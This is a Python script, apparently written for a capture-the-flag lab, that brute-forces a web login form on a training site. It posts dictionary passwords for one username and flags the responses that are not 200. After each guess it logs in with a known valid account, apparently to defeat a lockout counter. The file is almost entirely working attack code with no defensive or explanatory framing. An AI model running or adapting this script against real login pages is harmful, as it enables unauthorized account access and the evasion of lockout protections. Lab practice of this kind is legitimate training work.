# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.

from dictionary import *
import requests
from multiprocessing import Pool
from itertools import product

results = open('results.txt', 'w')


def send_login(username, password):
    url = 'https://labs.matesctf.org/lab/auth/4/index.php?page=login'

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    data = {'username': username,
            'password': password}

    response = requests.post(url=url,
                             headers=headers,
                             data=data,
                             allow_redirects=False)

    return response


def brute_force():
    dictionary = get_dictionary()
    usernames, passwords = dictionary.usernames, dictionary.passwords
    correct_user = 'armstrong'
    correct_password = 'strongpow'

    user = 'arizona'

    while passwords:
        password = passwords.pop()

        response = send_login(user, password)

        if response.status_code != 200:
            print((user, password))

        send_login(correct_user, correct_password)

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    # send_login('username', 'password')
    brute_force()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
